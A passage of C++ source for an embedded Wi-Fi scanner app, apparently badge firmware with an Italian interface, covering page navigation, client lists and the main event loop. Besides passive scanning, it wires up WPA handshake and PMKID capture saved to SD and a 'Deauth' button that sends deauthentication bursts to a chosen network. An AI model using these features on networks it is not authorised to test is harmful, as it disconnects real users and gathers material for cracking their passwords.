    auto* mac = lv_label_create(row);
    lv_label_set_long_mode(mac, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(mac, 1);

    addFieldLabel(row, COL_CDBM); // child 1: dBm
    addFieldLabel(row, COL_TX);   // child 2: TX
    addFieldLabel(row, COL_RX);   // child 3: RX
    return row;
}

void updateClientsPage(Context* ctx) {
    if (ctx->clientsList == nullptr) return;

    struct Row { uint64_t key; uint32_t frames; std::string mac; int rssi; uint32_t tx; uint32_t rx; };
    std::vector<Row> clientRows2;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        uint64_t selected = ctx->selectedKey;
        uint64_t now = nowMs();
        for (auto it = ctx->clients.begin(); it != ctx->clients.end();) {
            if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
                it = ctx->clients.erase(it);
                continue;
            }
            const auto& client = it->second;
            // Only the clients associated to the network whose detail we came from.
            if (client.associatedBssid != selected) { ++it; continue; }

            bool randomMac = (client.mac[0] & 0x02) != 0;
            const char* vendor = randomMac ? nullptr : lookupVendor(client.mac);
            std::string mac = macToString(client.mac) + (randomMac ? " (casuale)" : "");
            if (vendor != nullptr) mac += std::string(" - ") + vendor;

            clientRows2.push_back({it->first, client.packetCount, mac, client.lastRssi, client.txCount, client.rxCount});
            ++it;
        }
        ctx->mutex.unlock();
    }

    // Most active client (most frames) first. This decides the order only for rows being created;
    // existing rows keep their place so scrolling doesn't jump (see the no-reorder note below).
    std::sort(clientRows2.begin(), clientRows2.end(), [](const Row& a, const Row& b) { return a.frames > b.frames; });

    std::vector<uint64_t> keys;
    for (const auto& row : clientRows2) keys.push_back(row.key);
    for (auto it = ctx->clientRows.begin(); it != ctx->clientRows.end();) {
        if (std::find(keys.begin(), keys.end(), it->first) == keys.end()) {
            lv_obj_delete(it->second);
            it = ctx->clientRows.erase(it);
        } else {
            ++it;
        }
    }
    for (const auto& row : clientRows2) {
        lv_obj_t* widget;
        auto it = ctx->clientRows.find(row.key);
        if (it == ctx->clientRows.end()) {
            widget = createClientRow(ctx); // appended at the end; order is set fresh on page open
            ctx->clientRows[row.key] = widget;
        } else {
            widget = it->second;
        }
        char dbm[12], tx[12], rx[12];
        snprintf(dbm, sizeof(dbm), "%d", row.rssi);
        snprintf(tx, sizeof(tx), "%u", (unsigned)row.tx);
        snprintf(rx, sizeof(rx), "%u", (unsigned)row.rx);
        lv_label_set_text(lv_obj_get_child(widget, 0), row.mac.c_str());
        lv_label_set_text(lv_obj_get_child(widget, 1), dbm);
        lv_label_set_text(lv_obj_get_child(widget, 2), tx);
        lv_label_set_text(lv_obj_get_child(widget, 3), rx);
    }
    // No move_to_index: existing rows stay put (stable scrolling); new ones append at the end.
}

// ---- Page switching / toolbar back handling ----

void onHardwareBack(void* userData);

void setTitle(Context* ctx, const char* title) {
    if (ctx->toolbar != nullptr) lvgl_toolbar_set_title(ctx->toolbar, title);
}

void showPage(Context* ctx, Page page) {
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        ctx->page = page;
        ctx->mutex.unlock();
    }

    lv_obj_add_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);

    switch (page) {
        case Page::Graph:
            lv_obj_remove_flag(ctx->graphPage, LV_OBJ_FLAG_HIDDEN);
            setTitle(ctx, "Wi-Fi Scanner");
            break;
        case Page::List:
            lv_obj_remove_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
            setTitle(ctx, "Reti rilevate");
            break;
        case Page::Detail:
            lv_obj_remove_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
            setTitle(ctx, "Dettaglio rete");
            // Re-entering always starts from the top, not where the previous visit was left.
            if (ctx->detailScroll != nullptr) lv_obj_scroll_to_y(ctx->detailScroll, 0, LV_ANIM_OFF);
            if (ctx->detailClientsButton != nullptr && lv_obj_get_group(ctx->detailClientsButton) != nullptr) {
                lv_group_focus_obj(ctx->detailClientsButton);
            }
            updateDetail(ctx);
            break;
        case Page::Clients:
            lv_obj_remove_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
            setTitle(ctx, "Client della rete");
            // Rebuild from scratch so the order is freshly sorted by activity each time it opens
            // (it then stays stable while you scroll).
            for (auto& [k, w] : ctx->clientRows) lv_obj_delete(w);
            ctx->clientRows.clear();
            updateClientsPage(ctx);
            if (ctx->clientsList != nullptr) lv_obj_scroll_to_y(ctx->clientsList, 0, LV_ANIM_OFF);
            break;
    }

    // The physical back key steps one level instead of closing the app, except on the top page.
    lvgl_toolbar_set_back_override(page == Page::Graph ? nullptr : onHardwareBack, ctx);

    updateLeds(ctx); // entering/leaving the detail switches the strip to/from the per-network colour
}

void goBack(Context* ctx) {
    Page current;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        current = ctx->page;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (current == Page::Detail) showPage(ctx, Page::List);
    else if (current == Page::List) showPage(ctx, Page::Graph);
    else if (current == Page::Clients) showPage(ctx, Page::Detail); // clients opened from a network's detail
}

void onShowClients(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::Clients);
}

void onHardwareBack(void* userData) {
    goBack(static_cast<Context*>(userData));
}

void onBackPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    Page current;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        current = ctx->page;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (current == Page::Graph) {
        app_event_emit_close(ctx->appInstanceId);
    } else {
        goBack(ctx);
    }
}

// ---- Periodic refresh ----

void updateViews(Context* ctx) {
    RadioMode mode;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }

    // Stopped means frozen: keep whatever is already on screen, don't touch ctx->seen/clients.
    if (mode == RadioMode::Stopped) return;

    if (mode == RadioMode::ActiveScan) {
        auto activeResults = service::wifi::getScanResults();
        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
            mergeActiveScan(ctx, activeResults);
            ctx->mutex.unlock();
        }
    }

    std::vector<SeenAp> aps;
    std::map<uint64_t, int> clientCounts;
    size_t clientCount = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        aps = sortedByRssi(ctx);
        ctx->visible.clear();
        for (const auto& ap : aps) ctx->visible.push_back(bssidKey(ap.record.bssid));
        // Count only clients still active (seen within the expiry window), so the per-network
        // count goes down again when a client goes quiet instead of only ever growing.
        uint64_t now = nowMs();
        for (const auto& [clientKey, client] : ctx->clients) {
            if (client.associatedBssid != 0 && now - client.lastSeenMs <= ROW_EXPIRY_MS) {
                clientCounts[client.associatedBssid]++;
                clientCount++;
            }
        }
        ctx->mutex.unlock();
    }

    lvgl_lock();
    if (ctx->statusLabel != nullptr) {
        char status[80];
        if (!isRadioUsable()) {
            snprintf(status, sizeof(status), "Wi-Fi spento, lo accendo...");
        } else if (mode == RadioMode::Capture) {
#ifdef ESP_PLATFORM
            int hs = 0, pmkid = 0;
            if (ctx->mutex.lock(0)) { hs = ctx->handshakesSaved; pmkid = ctx->pmkidSeen; ctx->mutex.unlock(); }
            int lock = g_lockChannel.load();
            if (lock >= 1 && lock <= 13) {
                snprintf(status, sizeof(status), "LOCK ch%d - %u reti, %u cli - HS:%d PMKID:%d",
                    lock, (unsigned)aps.size(), (unsigned)clientCount, hs, pmkid);
            } else {
                snprintf(status, sizeof(status), "ch%d - %u reti, %u cli - HS:%d PMKID:%d",
                    g_hopChannel.load(), (unsigned)aps.size(), (unsigned)clientCount, hs, pmkid);
            }
#else
            snprintf(status, sizeof(status), "Cattura non disponibile in questo ambiente");
#endif
        } else {
            snprintf(status, sizeof(status), "%u reti%s", (unsigned)aps.size(),
                service::wifi::isScanning() ? " (scansione...)" : "");
        }
        lv_label_set_text(ctx->statusLabel, status);
    }

    Page page;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        page = ctx->page;
        ctx->mutex.unlock();
    } else {
        lvgl_unlock();
        return;
    }

    if (page == Page::Graph) updateGraph(ctx, aps);
    else if (page == Page::List) updateRows(ctx, aps, clientCounts);
    else if (page == Page::Detail) updateDetail(ctx);
    else if (page == Page::Clients) updateClientsPage(ctx);
    lvgl_unlock();

    updateLeds(ctx); // keep the strip in step (e.g. detail brightness as the signal changes)
}

void onTimer(Context* ctx) {
    using enum service::wifi::RadioState;
    auto state = service::wifi::getRadioState();
    RadioMode mode;
    if (ctx->mutex.lock(0)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (state == Off && mode != RadioMode::Stopped) {
        service::wifi::setEnabled(true);
    } else if (mode == RadioMode::ActiveScan && (state == On || state == ConnectionActive) && !service::wifi::isScanning()) {
        // Only in active-scan mode: a scan would fight the hopping task for the radio during
        // capture, and disturb the handshake while a connection is being set up.
        service::wifi::scan();
    }

    if (mode == RadioMode::Capture) flushHandshakes(ctx); // write any ready handshake to SD

    // Checked by window id, not app_scheduler_current_app_id(): this timer callback doesn't run
    // on the app's own task, so there is no "current app" thread-local to read here.
    if (window_manager_get_state(ctx->window) == WINDOW_STATE_GRANTED) updateViews(ctx);
}

void stopTimer(Context* ctx) {
    std::unique_ptr<Timer> timer;
    std::unique_ptr<Timer> ledTimer;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        timer = std::move(ctx->timer);
        ledTimer = std::move(ctx->ledTimer);
        ctx->mutex.unlock();
    }
    if (timer) timer->stop();
    if (ledTimer) ledTimer->stop();
}

// Fast feed for the detail VU bar: pushing the current level continuously keeps the bar steady
// (a 1 Hz feed would let the meter drain to zero between pushes and flicker).
void onLedTimer(Context* ctx) {
    if (!ctx->vuFeeding.load()) return;
    int base = ctx->vuLevel.load();

    // "Breath": at each fresh reading the bar swells above the real length, then (with decay on)
    // eases back to it over ~600 ms, and the peak dot lingers at the swell's top. This is done on
    // the LENGTH, via setVuLevels, because that always renders (a brightness pulse did not show on
    // this VU). The strip is horizontal, so the swell runs along it - nothing moves vertically.
    uint32_t sinceRefresh = (uint32_t)lv_tick_get() - ctx->vuRefreshTick.load();
    float swell = sinceRefresh < 600 ? 0.40f * (1.0f - (float)sinceRefresh / 600.0f) : 0.0f;
    int level = base + (int)(base * swell);
    if (level < 0) level = 0;
    if (level > 255) level = 255;

    service::neopixel::VuLevels levels{};
    levels.left = levels.right = levels.bass = levels.mid = levels.treble = (uint8_t)level;
    service::neopixel::setVuLevels(levels);
}

// ---- Widget construction ----

lv_obj_t* createPage(lv_obj_t* parent) {
    auto* page = lv_obj_create(parent);
    lv_obj_set_flex_flow(page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_width(page, LV_PCT(100));
    lv_obj_set_flex_grow(page, 1);
    lv_obj_set_style_pad_all(page, 0, 0);
    lv_obj_set_style_border_width(page, 0, 0);
    return page;
}

void createAxisLabels(lv_obj_t* parent) {
    auto* row = lv_obj_create(parent);
    lv_obj_set_size(row, LV_PCT(100), 16);
    lv_obj_set_style_pad_all(row, 0, 0);
    lv_obj_set_style_border_width(row, 0, 0);
    lv_obj_remove_flag(row, LV_OBJ_FLAG_SCROLLABLE);
    for (int channel = 1; channel <= 13; channel++) {
        char text[4];
        snprintf(text, sizeof(text), "%d", channel);
        auto* label = lv_label_create(row);
        lv_label_set_text(label, text);
        lv_obj_set_x(label, lv_pct((int)(100 * channelFraction(channel))));
        lv_obj_set_style_translate_x(label, channel < 10 ? -4 : -8, 0);
    }
}

/** Thin vertical reference lines centred on each channel number, so you can read which channel a
 * bell sits on. Placed over the chart, behind the name labels. */
void createChannelGrid(lv_obj_t* chartWrapper) {
    for (int channel = 1; channel <= 13; channel++) {
        auto* line = lv_obj_create(chartWrapper);
        lv_obj_set_size(line, 1, LV_PCT(100));
        lv_obj_set_style_border_width(line, 0, 0);
        lv_obj_set_style_radius(line, 0, 0);
        lv_obj_set_style_bg_color(line, lv_color_hex(0x606060), 0);
        lv_obj_set_style_bg_opa(line, LV_OPA_50, 0);
        lv_obj_remove_flag(line, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_remove_flag(line, LV_OBJ_FLAG_CLICKABLE);
        lv_obj_set_x(line, lv_pct((int)(100 * channelFraction(channel))));
    }
}

lv_obj_t* createIconButton(lv_obj_t* parent, const char* icon, lv_event_cb_t callback, Context* ctx, int size = 40) {
    auto* button = lv_button_create(parent);
    lv_obj_set_size(button, size, size);
    lv_obj_set_style_pad_all(button, 0, 0);
    auto* label = lv_label_create(button);
    lv_label_set_text(label, icon);
    lv_obj_center(label);
    lv_obj_add_event_cb(button, callback, LV_EVENT_SHORT_CLICKED, ctx);
    return button;
}

void createGraphPage(Context* ctx, lv_obj_t* parent) {
    ctx->graphPage = createPage(parent);

    // Everything but the button column lives in the left side, so the buttons never eat into
    // the chart's own height.
    auto* mainRow = lv_obj_create(ctx->graphPage);
    lv_obj_set_size(mainRow, LV_PCT(100), LV_PCT(100));
    lv_obj_set_flex_flow(mainRow, LV_FLEX_FLOW_ROW);
    lv_obj_set_style_pad_all(mainRow, 0, 0);
    lv_obj_set_style_pad_column(mainRow, 4, 0);
    lv_obj_set_style_border_width(mainRow, 0, 0);
    lv_obj_remove_flag(mainRow, LV_OBJ_FLAG_SCROLLABLE);

    auto* leftColumn = lv_obj_create(mainRow);
    lv_obj_set_flex_flow(leftColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_height(leftColumn, LV_PCT(100));
    lv_obj_set_flex_grow(leftColumn, 1);
    lv_obj_set_style_pad_all(leftColumn, 0, 0);
    lv_obj_set_style_border_width(leftColumn, 0, 0);
    lv_obj_remove_flag(leftColumn, LV_OBJ_FLAG_SCROLLABLE);

    ctx->statusLabel = lv_label_create(leftColumn);
    lv_label_set_text(ctx->statusLabel, "...");
    lv_obj_set_width(ctx->statusLabel, LV_PCT(100));

    auto* chartWrapper = lv_obj_create(leftColumn);
    lv_obj_set_width(chartWrapper, LV_PCT(100));
    lv_obj_set_flex_grow(chartWrapper, 1);
    lv_obj_set_style_pad_all(chartWrapper, 0, 0);
    lv_obj_set_style_border_width(chartWrapper, 0, 0);
    lv_obj_remove_flag(chartWrapper, LV_OBJ_FLAG_SCROLLABLE);

    ctx->chart = lv_chart_create(chartWrapper);
    lv_obj_set_size(ctx->chart, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->chart, 0, 0);
    lv_chart_set_type(ctx->chart, LV_CHART_TYPE_LINE);
    lv_chart_set_point_count(ctx->chart, CHART_POINTS);
    lv_chart_set_axis_range(ctx->chart, LV_CHART_AXIS_PRIMARY_Y, 0, SIGNAL_RANGE_DB);
    // No vertical grid: its even spacing never lines up with the 13 channels and looked like a
    // broken scale. The channel numbers under the chart are the horizontal scale instead.
    lv_chart_set_div_line_count(ctx->chart, 3, 0);
    lv_obj_set_style_size(ctx->chart, 0, 0, LV_PART_INDICATOR);
    lv_obj_set_style_line_width(ctx->chart, 2, LV_PART_ITEMS);
    lv_obj_remove_flag(ctx->chart, LV_OBJ_FLAG_SCROLLABLE);
    for (int i = 0; i < MAX_SERIES; i++) {
        ctx->series[i] = lv_chart_add_series(ctx->chart, lv_color_hex(SERIES_COLORS[i]), LV_CHART_AXIS_PRIMARY_Y);
        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
    }

    createChannelGrid(chartWrapper); // vertical reference lines on the channel numbers

    ctx->labelLayer = lv_obj_create(chartWrapper);
    lv_obj_set_size(ctx->labelLayer, LV_PCT(100), LV_PCT(100));
    lv_obj_set_style_pad_all(ctx->labelLayer, 0, 0);
    lv_obj_set_style_bg_opa(ctx->labelLayer, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(ctx->labelLayer, 0, 0);
    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_CLICKABLE);

    createAxisLabels(leftColumn);

    // Four small icon buttons, stacked, pinned to the far right.
    constexpr int BTN = 40;
    auto* rightColumn = lv_obj_create(mainRow);
    lv_obj_set_size(rightColumn, BTN, LV_PCT(100));
    lv_obj_set_flex_flow(rightColumn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(rightColumn, 0, 0);
    lv_obj_set_style_pad_row(rightColumn, 4, 0);
    lv_obj_set_style_border_width(rightColumn, 0, 0);
    lv_obj_remove_flag(rightColumn, LV_OBJ_FLAG_SCROLLABLE);

    // WiFi = scansione normale (come la vecchia app) / "CH" = channel hopping (cattura passiva) /
    // ferma tutto / lista reti. I client si vedono entrando nel dettaglio di una rete.
    ctx->scanButton = createIconButton(rightColumn, LV_SYMBOL_WIFI, onStartScan, ctx, BTN);
    ctx->captureButton = createIconButton(rightColumn, "CH", onStartCapture, ctx, BTN);
    ctx->stopButton = createIconButton(rightColumn, LV_SYMBOL_STOP, onStop, ctx, BTN);
    createIconButton(rightColumn, LV_SYMBOL_LIST, onShowList, ctx, BTN);
    refreshModeButtons(ctx);
}

/** Adds a right-aligned fixed-width column label to the legend header (mirrors addFieldLabel). */
void addLegendLabel(lv_obj_t* header, const char* text, int width) {
    auto* label = lv_label_create(header);
    lv_obj_set_width(label, width);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
    lv_label_set_text(label, text);
}

void createListPage(Context* ctx, lv_obj_t* parent) {
    ctx->listPage = createPage(parent);
    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);

    // Legend header, laid out with the same columns as the rows so the titles sit over their
    // numbers. This lets the rows show bare numbers (no "ch"/"dBm" text eating width).
    auto* header = lv_obj_create(ctx->listPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    auto* spacer = lv_obj_create(header); // matches the row's 6px colour bar
    lv_obj_set_size(spacer, 6, 1);
    lv_obj_set_style_border_width(spacer, 0, 0);
    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);
    auto* nameHdr = lv_label_create(header);
    lv_label_set_text(nameHdr, "Rete");
    lv_obj_set_flex_grow(nameHdr, 1);
    addLegendLabel(header, "ch", COL_CH);
    addLegendLabel(header, "bcn", COL_POWER);
    addLegendLabel(header, "sec", COL_SEC);
    addLegendLabel(header, "cli", COL_CLI);

    // lv_list (not a bare container): its buttons join the keypad group, so the badge's up/down
    // keys move the focus and scroll the list - a custom container would not scroll.
    ctx->list = lv_list_create(ctx->listPage);
    lv_obj_set_width(ctx->list, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->list, 1);
    // Zero the list's own horizontal padding so each row starts at the same x as the header above
    // (the row's own 2px padding then matches the header's), keeping the columns lined up.
    lv_obj_set_style_pad_all(ctx->list, 0, 0);
    lv_obj_set_style_pad_row(ctx->list, 2, 0);
}

void createDetailPage(Context* ctx, lv_obj_t* parent) {
    ctx->detailPage = createPage(parent);
    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_style_pad_all(ctx->detailPage, 4, 0);

    // Everything lives in an lv_list so it scrolls with the badge keys. Two focusable buttons -
    // "Client" at the top and "Connetti" at the bottom - give an up target and a down target, so
    // the arrows scroll the page both ways (with a single button you could only go down).
    auto* scroll = lv_list_create(ctx->detailPage);
    lv_obj_set_width(scroll, LV_PCT(100));
    lv_obj_set_flex_grow(scroll, 1);
    ctx->detailScroll = scroll;

    ctx->detailClientsButton = lv_list_add_button(scroll, LV_SYMBOL_LIST, "Client associati (0)");
    lv_obj_add_event_cb(ctx->detailClientsButton, onShowClients, LV_EVENT_CLICKED, ctx);

    if (isCaptureSupported()) {
        ctx->detailLockButton = lv_list_add_button(scroll, LV_SYMBOL_GPS, "Cattura mirata");
        lv_obj_add_event_cb(ctx->detailLockButton, onToggleLock, LV_EVENT_CLICKED, ctx);

        // Red: this one actively disconnects real clients, unlike the other (passive) buttons.
        ctx->detailDeauthButton = lv_list_add_button(scroll, LV_SYMBOL_WARNING, "Deauth");
        lv_obj_set_style_bg_color(ctx->detailDeauthButton, lv_color_hex(0xB33A3A), 0);
        lv_obj_set_style_bg_opa(ctx->detailDeauthButton, LV_OPA_50, 0);
        lv_obj_add_event_cb(ctx->detailDeauthButton, onDeauthPressed, LV_EVENT_CLICKED, ctx);

        // Right under Deauth, so you can tell at a glance whether it caught anything without
        // scrolling down to the full "Handshake: ..." line.
        ctx->detailHsSummary = lv_label_create(scroll);
        lv_obj_set_width(ctx->detailHsSummary, LV_PCT(100));
        lv_label_set_text(ctx->detailHsSummary, "HS: 0/4   PMKID: no");
    }

    ctx->detailInfo = lv_label_create(scroll);
    lv_label_set_long_mode(ctx->detailInfo, LV_LABEL_LONG_MODE_WRAP);
    lv_obj_set_width(ctx->detailInfo, LV_PCT(100));

    ctx->connectButton = lv_list_add_button(scroll, LV_SYMBOL_WIFI, "Connetti");
    lv_obj_add_event_cb(ctx->connectButton, onConnectPressed, LV_EVENT_CLICKED, ctx);
}

void createClientsPage(Context* ctx, lv_obj_t* parent) {
    ctx->clientsPage = createPage(parent);
    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);

    // Legend header lined up with the client row columns.
    auto* header = lv_obj_create(ctx->clientsPage);
    lv_obj_set_size(header, LV_PCT(100), 18);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(header, 2, 0);
    lv_obj_set_style_pad_column(header, 4, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    auto* macHdr = lv_label_create(header);
    lv_label_set_text(macHdr, "Client (MAC)");
    lv_obj_set_flex_grow(macHdr, 1);
    addLegendLabel(header, "dBm", COL_CDBM);
    addLegendLabel(header, "TX", COL_TX);
    addLegendLabel(header, "RX", COL_RX);

    ctx->clientsList = lv_list_create(ctx->clientsPage);
    lv_obj_set_width(ctx->clientsList, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->clientsList, 1);
    lv_obj_set_style_pad_all(ctx->clientsList, 0, 0);
    lv_obj_set_style_pad_row(ctx->clientsList, 2, 0);
}

void createWidgets(lv_obj_t* parent, void* userData) {
    auto* ctx = static_cast<Context*>(userData);

    lv_obj_set_flex_flow(parent, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(parent, 0, LV_STATE_DEFAULT);

    ctx->toolbar = lvgl_toolbar_create(parent, "Wi-Fi Scanner");
    lvgl_toolbar_set_nav_action(ctx->toolbar, LV_SYMBOL_CLOSE, onBackPressed, ctx);

    auto* wrapper = lv_obj_create(parent);
    lv_obj_set_flex_flow(wrapper, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_width(wrapper, LV_PCT(100));
    lv_obj_set_flex_grow(wrapper, 1);
    lv_obj_set_style_pad_all(wrapper, 4, 0);

    createGraphPage(ctx, wrapper);
    createListPage(ctx, wrapper);
    createDetailPage(ctx, wrapper);
    createClientsPage(ctx, wrapper);

    showPage(ctx, ctx->page);
}

void destroyWidgets(void* userData) {
    auto* ctx = static_cast<Context*>(userData);
    lvgl_toolbar_set_back_override(nullptr, nullptr);
    ctx->toolbar = nullptr;
    ctx->statusLabel = nullptr;
    ctx->graphPage = nullptr;
    ctx->chart = nullptr;
    ctx->labelLayer = nullptr;
    for (auto& series : ctx->series) series = nullptr;
    ctx->scanButton = nullptr;
    ctx->captureButton = nullptr;
    ctx->stopButton = nullptr;
    ctx->listPage = nullptr;
    ctx->list = nullptr;
    ctx->rows.clear();
    ctx->detailPage = nullptr;
    ctx->detailScroll = nullptr;
    ctx->detailInfo = nullptr;
    ctx->detailClientsButton = nullptr;
    ctx->detailLockButton = nullptr;
    ctx->detailDeauthButton = nullptr;
    ctx->detailHsSummary = nullptr;
    ctx->connectButton = nullptr;
    ctx->clientsPage = nullptr;
    ctx->clientsList = nullptr;
    ctx->clientRows.clear();
}

int32_t appMain(int /*argc*/, char* /*argv*/[]) {
    uint32_t appInstanceId = app_scheduler_current_app_id();
    Context ctx;
    ctx.appInstanceId = appInstanceId;

    TaskEventGroup event_group {};
    task_event_group_construct(&event_group);

    AppEventSubscription sub {};
    check(app_event_subscribe(&sub, &event_group) == ERROR_NONE);

    ctx.window = window_manager_create_ext(appInstanceId, createWidgets, destroyWidgets, &ctx);

    service::wifi::setScanRecords(MAX_RECORDS);
    // Auto-connect scans would compete with this app's own scans and with capture.
    service::wifi::setAutoScanPaused(true);

    // Remember the strip's current look so we can hand it back untouched when the app exits.
    saveLedConfig(&ctx);

    ctx.timer = std::make_unique<Timer>(Timer::Type::Periodic, REFRESH_MS, [&ctx] {
        onTimer(&ctx);
    });
    ctx.timer->start();

    ctx.ledTimer = std::make_unique<Timer>(Timer::Type::Periodic, 50, [&ctx] {
        onLedTimer(&ctx);
    });
    ctx.ledTimer->start();

    bool shouldClose = false;
    while (!shouldClose) {
        task_event_group_wait_any(&event_group, nullptr, portMAX_DELAY);

        AppEvent event {};
        while (app_event_poll(&sub, &event) == ERROR_NONE) {
            if (event.type == APP_EVENT_CLOSE) {
                shouldClose = true;
                break;
            } else if (event.type == APP_EVENT_RESULT) {
                if (event.result.launch_id == ctx.deauthDialogId.load() && event.result.result == 0) {
                    uint8_t bssid[6];
                    int channel = 0;
                    bool found = false;
                    RadioMode currentMode = RadioMode::Stopped;
                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                        auto it = ctx.seen.find(ctx.selectedKey);
                        if (it != ctx.seen.end()) {
                            memcpy(bssid, it->second.record.bssid, 6);
                            channel = it->second.record.channel;
                            found = true;
                        }
                        currentMode = ctx.mode;
                        ctx.mutex.unlock();
                    }
                    // Same reason the targeted-capture lock exists: off the target's channel,
                    // the deauth frames just go out into whatever channel we're hopping through.
                    if (found && channel >= 1 && channel <= 13) {
                        if (currentMode != RadioMode::Capture) {
                            // setMode() touches LVGL widgets (button states); this handler runs
                            // on the app's own task, not the LVGL task, so it must hold the lock
                            // itself (updateDetail()'s callers from onTimer do the same).
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        // Blocks this task briefly (waiting for the lock to actually take
                        // effect, then the burst itself) - fine, it's this app's own dedicated
                        // task, not the LVGL or timer task.
                        sendDeauthBurstOnChannel(bssid, channel);
                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                            ctx.deauthBurstsSent++;
                            ctx.mutex.unlock();
                        }
                    }
                }
                app_manager_stop(event.result.launch_id);
            }
        }
    }

    stopTimer(&ctx);
    stopCapture(&ctx);
    service::wifi::setAutoScanPaused(false);
    restoreLedConfig(&ctx); // give the strip back exactly as we found it

    window_manager_remove(ctx.window);
    check(app_event_unsubscribe(&sub) == ERROR_NONE);
    task_event_group_destruct(&event_group);

    return 0;
}

} // namespace

extern const ::AppManifest manifest = {
    .id = "WifiScanner",
    .name = "Wi-Fi Scanner",
    .category = APP_CATEGORY_SYSTEM,
    .location = { APP_LOCATION_MEMORY, reinterpret_cast<void*>(appMain) }
};

} // namespace tt::app::wifiscanner
